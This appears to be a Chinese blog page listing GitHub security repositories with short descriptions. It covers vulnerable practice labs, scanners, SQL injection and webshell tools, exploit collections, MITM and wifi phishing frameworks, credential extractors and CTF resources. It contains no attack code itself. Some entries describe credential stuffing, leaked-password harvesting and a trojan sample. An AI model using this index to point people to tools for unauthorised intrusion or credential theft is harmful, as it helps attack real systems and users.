<h3 id="数据库注入练习平台"><a href="#数据库注入练习平台" class="headerlink" title="数据库注入练习平台"></a><strong>数据库注入练习平台</strong></h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p>用node编写的漏洞练习平台，like OWASP Node Goat</p>
<p><a href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a></p>
<h3 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h3><p>端口扫描器Nmap</p>
<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
<h3 id="本地网络扫描器"><a href="#本地网络扫描器" class="headerlink" title="本地网络扫描器"></a>本地网络扫描器</h3><p><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a></p>
<h3 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h3><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<h3 id="漏洞路由扫描器"><a href="#漏洞路由扫描器" class="headerlink" title="漏洞路由扫描器"></a>漏洞路由扫描器</h3><p><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a></p>
<h3 id="迷你批量信息泄漏扫描脚本"><a href="#迷你批量信息泄漏扫描脚本" class="headerlink" title="迷你批量信息泄漏扫描脚本"></a>迷你批量信息泄漏扫描脚本</h3><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p>
<h3 id="Waf类型检测工具"><a href="#Waf类型检测工具" class="headerlink" title="Waf类型检测工具"></a>Waf类型检测工具</h3><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p>
<p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a></p>
<p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p>
<p><a href="https://github.com/sea-god/gitscan">https://github.com/sea-god/gitscan</a></p>
<p>github Repo信息搜集工具</p>
<p><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a></p>
<h3 id="WEB工具"><a href="#WEB工具" class="headerlink" title="WEB工具"></a>WEB工具</h3><p>webshell大合集</p>
<p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
<p>渗透以及web攻击脚本</p>
<p><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a></p>
<p>web渗透小工具大合集</p>
<p><a href="https://github.com/rootphantomer/hack*tools*for_me">https://github.com/rootphantomer/hack*tools*for_me</a></p>
<p>XSS数据接收平台</p>
<p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<p>XSS与CSRF工具</p>
<p><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a></p>
<p>Short for command injection exploiter，web向命令注入检测工具</p>
<p><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a></p>
<p>数据库注入工具</p>
<p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>Web代理，通过加载sqlmap api进行sqli实时检测</p>
<p><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a></p>
<p>新版中国菜刀</p>
<p><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
<p>.git泄露利用EXP</p>
<p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>浏览器攻击框架</p>
<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
<p>自动化绕过WAF脚本</p>
<p><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a></p>
<p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p>
<p><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a></p>
<p>浏览器调试利器</p>
<p><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a></p>
<p>一款开源WAF</p>
<p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p>
<h3 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h3><p>windows渗透神器</p>
<p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
<p>Powershell渗透库合集</p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>Powershell tools合集</p>
<p><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a></p>
<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>Web向Fuzz工具</p>
<p><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<p>HTTP暴力破解，撞库攻击脚本</p>
<p><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
<h3 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h3><p>msf</p>
<p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
<p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p>
<p><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a></p>
<p>Pocsuite</p>
<p><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p>
<p>Beebeeto</p>
<p><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a></p>
<h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><p>ExploitDB官方git版本</p>
<p><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a></p>
<p>php漏洞代码分析</p>
<p><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a></p>
<p>Simple test for CVE-2016-2107</p>
<p><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a></p>
<p>CVE-2015-7547 POC</p>
<p><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a></p>
<p>JAVA反序列化POC生成工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>JAVA反序列化EXP</p>
<p><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
<p>Jenkins CommonCollections EXP</p>
<p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
<p>CVE-2015-2426 EXP (windows内核提权)</p>
<p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p>
<p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p>
<p><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a></p>
<p>php7缓存覆写漏洞Demo及相关工具</p>
<p><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></p>
<p>XcodeGhost木马样本</p>
<p><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><p>中间人攻击框架</p>
<p><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
<p><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a></p>
<p><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a></p>
<p>Inject code, jam wifi, and spy on wifi users</p>
<p><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></p>
<p>可扩展的中间人代理工具</p>
<p><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a></p>
<p>wifi钓鱼</p>
<p><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>密码破解工具</p>
<p><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a></p>
<p>本地存储的各类密码提取利器</p>
<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<h3 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h3><p>二进制分析工具</p>
<p><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a></p>
<p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p>
<p><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a></p>
<p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE&#x2F;Elf&#x2F;Mach-O (doesn’t support the FAT binaries) x86&#x2F;x64 binaries.</p>
<p><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a></p>
<p>Windows Exploit Development工具</p>
<p><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a></p>
<p>二进制静态分析工具（python）</p>
<p><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a></p>
<p>Python Exploit Development Assistance for GDB</p>
<p><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
<p>对BillGates Linux Botnet系木马活动的监控工具</p>
<p><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a></p>
<p>木马配置参数提取工具</p>
<p><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a></p>
<p>Shellphish编写的二进制分析工具（CTF向）</p>
<p><a href="https://github.com/angr/angr">https://github.com/angr/angr</a></p>
<p>针对python的静态代码分析工具</p>
<p><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a></p>
<p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p>
<p><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a></p>
<p>基于AST变换的简易Javascript反混淆辅助工具</p>
<p><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
<h3 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h3><p>二进制EXP编写工具</p>
<p><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a></p>
<p>CTF Pwn 类题目脚本编写框架</p>
<p><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
<p>an easy-to-use io library for pwning development</p>
<p><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a></p>
<p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p>
<p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
<h3 id="隐写相关工具"><a href="#隐写相关工具" class="headerlink" title="隐写相关工具"></a>隐写相关工具</h3><p>隐写检测工具</p>
<p><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
<h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料"></a>各类安全资料</h3><p>域渗透教程</p>
<p><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
<p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/%EF%BC%89">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p>
<p><a href="https://github.com/smartFlash/pySecurity">https://github.com/smartFlash/pySecurity</a></p>
<p>data_hacking合集</p>
<p><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a></p>
<p>mobile-security-wiki</p>
<p><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a></p>
<p>书籍《reverse-engineering-for-beginners》</p>
<p><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a></p>
<p>一些信息安全标准及设备配置</p>
<p><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a></p>
<p>APT相关笔记</p>
<p><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a></p>
<p>Kcon资料</p>
<p><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a></p>
<p>ctf及黑客资源合集</p>
<p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p>
<p>ctf和安全工具大合集</p>
<p><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a></p>
<p>《DO NOT FUCK WITH A HACKER》</p>
<p><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a></p>
<h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><p>近年ctf writeup大全</p>
<p><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a></p>
<p><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a></p>
<p><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a></p>
<p>fbctf竞赛平台Demo</p>
<p><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a></p>
<p>ctf Resources</p>
<p><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a></p>
<h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h3><p>大礼包（什么都有）</p>
<p><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a></p>
<p>bash-handbook</p>
<p><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a></p>
<p>python资源大全</p>
<p><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a></p>
<p>git学习资料</p>
<p><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a></p>
<p>安卓开源代码解析</p>
<p><a href="https://github.com/android-cn/android-open-project-analysis">https://github.com/android-cn/android-open-project-analysis</a></p>
<p>python框架，库，资源大合集</p>
<p><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a></p>
<p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</p>
<p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p>
<p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p>
<p>python任务管理以及命令执行库</p>
<p><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a></p>
<p>python exe打包库</p>
<p><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a></p>
<p>py3 爬虫框架</p>
<p><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a></p>
<p>一个提供底层接口数据包编程和网络协议支持的python库</p>
<p><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a></p>
<p>python requests 库</p>
<p><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a></p>
<p>python 实用工具合集</p>
<p><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a></p>
<p>python爬虫系统</p>
<p><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
<p>ctf向 python工具包</p>
<p><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
<h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><p>科学上网工具</p>
<p><a href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a></p>
<h3 id="老司机福利"><a href="#老司机福利" class="headerlink" title="老司机福利"></a>老司机福利</h3><p>微信自动抢红包动态库</p>
<p><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a></p>
<p>微信抢红包插件（安卓版）</p>
<p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p>
<p>神器</p>
<p><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>以下内容来自：<a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a> 子域名枚举类</p>
<p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> (经典的子域名爆破枚举脚本)</p>
<p><a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a> (子域名字典穷举)</p>
<p><a href="https://github.com/le4f/dnsmaper">https://github.com/le4f/dnsmaper</a> (子域名枚举与地图标记)</p>
<p><a href="https://github.com/0xbug/orangescan">https://github.com/0xbug/orangescan</a> (在线子域名信息收集工具)</p>
<p><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a> （根据DNS记录查询子域名)</p>
<p><a href="https://github.com/We5ter/GoogleSSLdomainFinder">https://github.com/We5ter/GoogleSSLdomainFinder</a> (基于谷歌SSL透明证书的子域名查询脚本)</p>
<p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</p>
<p><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a> (A domain scanner）</p>
<p><a href="https://github.com/Evi1CLAY/Cool">https://github.com/Evi1CLAY/Cool</a> … Python&#x2F;DomainSeeker（多方式收集目标子域名信息）</p>
<p>数据库漏洞扫描类</p>
<p><a href="https://github.com/0xbug/SQLiScanner">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</p>
<p><a href="https://github.com/stamparm/DSSS">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</p>
<p><a href="https://github.com/LoRexxar/Feigong%EF%BC%88%E9%92%88%E5%AF%B9%E5%90%84%E7%A7%8D%E6%83%85%E5%86%B5%E8%87%AA%E7%94%B1%E5%8F%98%E5%8C%96%E7%9A%84MySQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%EF%BC%89">https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）</a></p>
<p><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</p>
<p><a href="https://github.com/Neohapsis/bbqsql%EF%BC%88SQL%E7%9B%B2%E6%B3%A8%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%EF%BC%89">https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）</a></p>
<p><a href="https://github.com/NetSPI/PowerUpSQL%EF%BC%88%E6%94%BB%E5%87%BBSQLSERVER%E7%9A%84Powershell%E8%84%9A%E6%9C%AC%E6%A1%86%E6%9E%B6%EF%BC%89">https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）</a></p>
<p>弱口令或信息泄漏扫描类</p>
<p><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</p>
<p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</p>
<p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> (.git文件夹泄漏利用工具)</p>
<p><a href="https://github.com/wilson9x1/fenghuangscanner_v3">https://github.com/wilson9x1/fenghuangscanner_v3</a> (端口及弱口令检测)</p>
<p><a href="https://github.com/ysrc/F-Scrack">https://github.com/ysrc/F-Scrack</a> (对各类服务进行弱口令检测的脚本)</p>
<p><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</p>
<p><a href="https://github.com/RicterZ/genpAss">https://github.com/RicterZ/genpAss</a> （中国特色的弱口令生成器）</p>
<p><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a> （go写的协程版的ssh\redis\mongodb弱口令破解工具）</p>
<p>物联网设备扫描</p>
<p><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</p>
<p><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</p>
<p>xss扫描器</p>
<p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （Cross-Site Scripting Bruteforcer）</p>
<p><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a> (A small python script to check for Cross-Site Tracing)</p>
<p><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</p>
<p><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a> (批量扫描xss的python脚本）</p>
<p>企业网络自检</p>
<p><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a> （详细的内部网络信息扫描器）</p>
<p><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</p>
<p><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> (javascript实现的本地网络扫描器)</p>
<p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</p>
<p><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</p>
<p>webshell检测</p>
<p><a href="https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/">https://github.com/We5ter/Scanners-Box/tree/master/Find_webshell/</a> （php后门检测，脚本较简单，因此存在误报高和效率低下的问题）</p>
<p><a href="https://github.com/yassineaddi/BackdoorMan">https://github.com/yassineaddi/BackdoorMan</a> （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination）</p>
<p>内网渗透</p>
<p><a href="https://github.com/0xwindows/VulScritp">https://github.com/0xwindows/VulScritp</a> （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等）</p>
<p><a href="https://github.com/lcatro/network*backdoor*scanner%EF%BC%88%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%9A%84%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E6%A1%86%E6%9E%B6%EF%BC%89">https://github.com/lcatro/network*backdoor*scanner（基于网络流量的内网探测框架）</a></p>
<p><a href="https://github.com/fdiskyou/hunter%EF%BC%88%E8%B0%83%E7%94%A8">https://github.com/fdiskyou/hunter（调用</a> Windows API 枚举用户登录信息）</p>
<p>中间件扫描、指纹识别类</p>
<p><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</p>
<p><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</p>
<p><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a> （ssl类型识别)</p>
<p><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a> (web指纹识别)</p>
<p><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a> (web应用指纹识别)</p>
<p><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</p>
<p><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a> (a fast Network scanner inspired by Masscan and Zmap)</p>
<p><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</p>
<p><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</p>
<p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> (Web path scanner)</p>
<p><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</p>
<p><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a> (端口服务扫描)</p>
<p><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</p>
<p><a href="https://github.com/3xp10it/mytools/blob/master/xcdn.py%EF%BC%88%E8%8E%B7%E5%8F%96cdn%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E5%AE%9Eip%EF%BC%89">https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）</a></p>
<p><a href="https://github.com/Xyntax/BingC%EF%BC%88%E5%9F%BA%E4%BA%8EBing%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84C%E6%AE%B5/%E6%97%81%E7%AB%99%E6%9F%A5%E8%AF%A2%EF%BC%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%8C%E6%94%AF%E6%8C%81API%EF%BC%89">https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</a></p>
<p><a href="https://github.com/Xyntax/DirBrute%EF%BC%88%E5%A4%9A%E7%BA%BF%E7%A8%8BWEB%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）</a></p>
<p><a href="https://github.com/zer0h/httpscan%EF%BC%88%E4%B8%80%E4%B8%AA%E7%88%AC%E8%99%AB%E5%BC%8F%E7%9A%84%E7%BD%91%E6%AE%B5Web%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）</a></p>
<p><a href="https://github.com/lietdai/doom%EF%BC%88thorn%E4%B8%8A%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%86%E5%8F%91%E7%9A%84ip%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%EF%BC%89">https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）</a></p>
<p><strong>专用扫描器</strong></p>
<p><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</p>
<p><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a> (discuz扫描)</p>
<p><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a> (CMS攻击框架)</p>
<p><a href="https://github.com/lijiejie/IIS*shortname*Scanner">https://github.com/lijiejie/IIS*shortname*Scanner</a> (an IIS shortname Scanner)</p>
<p><a href="https://github.com/We5ter/Scanne">https://github.com/We5ter/Scanne</a> … ter&#x2F;FlashScanner.pl (flashxss扫描)</p>
<p><a href="https://github.com/coffeehb/SSTIF%EF%BC%88%E4%B8%80%E4%B8%AAFuzzing%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）</a></p>
<p><strong>无线网络</strong></p>
<p><a href="https://github.com/savio-code/fern-wifi-cracker/">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</p>
